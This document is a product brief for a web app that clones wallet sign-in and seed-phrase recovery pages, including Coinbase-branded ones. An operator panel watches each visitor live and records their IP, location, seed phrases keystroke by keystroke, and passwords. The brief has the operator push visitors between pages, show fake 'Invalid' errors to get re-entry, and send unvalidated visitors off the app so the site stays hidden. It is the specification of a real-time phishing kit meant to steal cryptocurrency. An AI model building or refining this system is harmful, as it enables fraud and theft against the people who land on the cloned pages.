START FRESH — what we want
=========================
This file is the product. Stack is the developer’s call. Do not copy leftover PHP.

I tried to describe everything I want it to do. You do not have to follow this 1:1.
This is ideally how I want the program to behave.

Read with:
  Clean family folders  = visitor page look
  photos/               = Admin look
  coinbase/vault/vault.txt = vault card

If anything is unclear, ask. Do not guess a product rule.

Sessions
--------
Each tab is its own session. Two tabs = two sessions. They never share.
Same-tab refresh within about 20–30 minutes = same session.
Close-tab-then-reopen: developer’s call, as long as tabs do not share.

They become a valid session by coming through the starting page.
A stranger cannot open a deep family URL and become a session that way.
No session + deep URL = offline URL.
A valid session can open any page URL themselves.

Presence and Send
-----------------
Viewing the tab = Connected. Not viewing = Idle. Those are the only two.
Send works only if they are Connected. It does not queue. You cannot move someone who is Idle.
Send sends them to the page Admin chose.
Admin picks that page on the selected session, from the menu on the right.
The menu is every page from every family, grouped by family. Loading pages are in it too.
Clicking a page only chooses it. Nothing moves until Send.
When Admin selects another session, that menu resets.
Only one session is selected at a time.

They do not walk the site themselves. There is no autoflow.
Exception: Continue / submit on a page goes to that family’s loading page.
They stay on loading until Admin Sends.

X sends them to the session exit, removes them from the Admin list, and keeps them in the database.
After X they are gone from Admin for good. No Admin lookup.

Starting page, settings, exit
-----------------------------
Everyone lands on the same starting page. Admin picks it in settings.
domain.com/ goes to that starting page. The address bar becomes that page’s URL.

Admin settings:
  - enable panel
  - notifications (on / off)
  - starting page
  - exit URL (one URL for the whole site)

Enable panel on = the site is on.
Enable panel off = everyone already on the site goes to the offline URL, off the app.
New people also go to that offline URL instantly. They never touch the app.
Admin can still open Admin when the site is off, and turn enable panel back on.

Offline URL = stored in the database. Not picked in settings. It is a configured URL off the app.
Session exit = the settings exit URL.
By default that settings exit URL is the offline URL. Admin can change it.
They are different things: offline stays the database default; settings exit starts as a copy of it.

Notifications
-------------
A slight sound only. No popup.
Plays when a new session first joins, and again when they hit that family’s loading page.

Admin sign-in
-------------
One Admin. One key at a time.
Sign-in can be a key in the URL, example:
  domain.com/admin/key?=SKDKD-DKDKD-DKDKD
After that the address bar is a clean Admin URL. The key is not left in it.
The same key can be used again until a new one is made.
Refresh = type the key again. Logout = type the key again.
Logout is a simple button, bottom left or similar.

A new key is made outside Admin, not from inside the panel. Telegram is an option.
A new key kills the old one immediately. Anyone still on the old key is signed out.
Wrong key just fails. Extra lockout is the developer’s call.
How the generate path is built is the developer’s call. It has to stay secure if the VPS is exposed.

The live site is HTTPS. Production-ready and hardened.

Admin list (live)
-----------------
Live 1:1 over websockets. Do not poll. Do not redraw the whole Admin UI for one change.
Each box updates on its own. Each session is isolated.
New session = add one row. X = remove that row. Other rows stay still.

Admin sees what they are doing. Current page is live. Idle keeps the last page.
Each row shows current page, IP, location, and the other fields from the photos.
Location is filled automatically when they join.

While they type, the Admin box shows the live text, like [ dddd ].
That box is not a keystroke trail. When they leave the page, the last text stays.
Coming back updates the same box.

Seed-phrase boxes: database keeps every keystroke in order (d, dd, ddd, dd, d).
If they submit or get redirected, that box is permanent and cannot be overwritten.
Password and other boxes are not that important: same box, later typing updates it.
On those pages the database only saves when they submit.
Only important entries stay on the Admin UI.

Admin page cards
----------------
Three card types. Type is per page.

1. Send / Preview only.
2. Default / Invalid, then Send / Preview.
3. Disconnect / Recover (changes the URL), then Default / Invalid, then Send / Preview.

Preview is Admin-only, isolated, not a real session. It opens only if Admin clicks Preview.
The visitor never sees Preview. The visitor only sees a change after Send.

Default = normal look of that page.
Invalid = brief invalid message on the same page. It matches that page.
Send Invalid / Send Default refreshes the page if they are already on it.
After Send, Default / Invalid goes back to its normal default.

Some pages have extra fields that match text already on the page (example: “last 2” → type 34).
Empty field = nothing changes. After Send, that field clears on the Admin card.
Send again with it empty = page goes back to the original text.

Visitor navigation uses PRG (Post/Redirect/Get). No browser form-resubmission warning.

Look
----
Visitor pages: same look and layout as the Clean family folders. Rebuild in any stack, do not redesign.
Especially the wallet pages. They have to work on all device types.
Admin: simple, like the photos. Not pixel-exact. Computer only.

Family URLs
-----------
Common family (set at deploy, developer’s call): clean URLs, no family name.
  domain.com/loading
  domain.com/recover
  domain.com/signin
  (every page in that family)

Other families: domain.com/family/page.
domain.com/loading can work if it is configured to that family’s loading page. Otherwise developer’s call.

Database
--------
Tables / stack = developer’s call. Names below are the jobs, not a frozen schema.
After X, keep basic session info and box contents.
Auto-delete after a reasonable few days. Exact days = developer’s call.
That clock starts when they enter the site.
See the tree at the bottom.

Database tree (responsibilities)
--------------------------------
developer names the real tables. these are the owners.

site
├── offline_url
│     database default. off the application.
│     enable panel off, and no-session deep URLs, go here.
└── settings
      enable panel
      notifications on / off
      starting page
      exit_url          one for the whole site.
                        defaults to a copy of offline_url.
                        Admin can change it. not the same row as offline_url.

admin
├── admin_key
│     one live key at a time.
│     new key kills the old one.
│     generated outside the panel.
└── admin_audit
      Admin signed in / out
      Send
      X
      settings change (enable, notify, starting page, exit url)
      key replaced
      not a visitor box. not a session list.

user_sessions
      one row per tab / session.
      identity
      validated (came through the starting page)
      presence: Connected or Idle
      current page
      IP
      location          filled on join
      extra row fields from the photos (same row, not a new table)
      joined_at         retention clock starts here
      still on Admin list until X
      after X: gone from Admin UI, row can stay until retention delete

session_page_state
      what the visitor page is actually showing after a successful Send.
      Default or Invalid for that page
      applied page values (example: last 2 = 34)
      this is not the Admin card draft.
      draft dies on switch / refresh; this stays until the next Send changes it.
      Send with an empty value puts the page back to original.

user_events
      what they did in the boxes, tied to user_sessions.
      seed-phrase pages: every keystroke in order (d, dd, ddd…).
                        lock after submit or redirect. do not overwrite.
      other boxes: save on submit. same box, later typing updates it.
      only important entries stay on the Admin UI.
      live typing also goes over websockets. that live view is not this table.

vault
      per session. see coinbase/vault/vault.txt.
      the generated seed
      after Vault Send: permanent Admin entry + visitor on vault-balance
      vault_coins
            BTC ETH SOL XRP DOGE
            address from that seed
            amount if Admin typed one
            live prices are pinged, not a price-history table

not required as tables
      family / page list for the right menu — can be code.
      which family is common — deploy config.

do not store
      unsent Admin card drafts (Default / Invalid, last-2, chosen dest).
      those die on session switch, Send, and Admin refresh.
      Preview. never a real session or a DB row.
      a Send queue. Send is live or it does not happen.
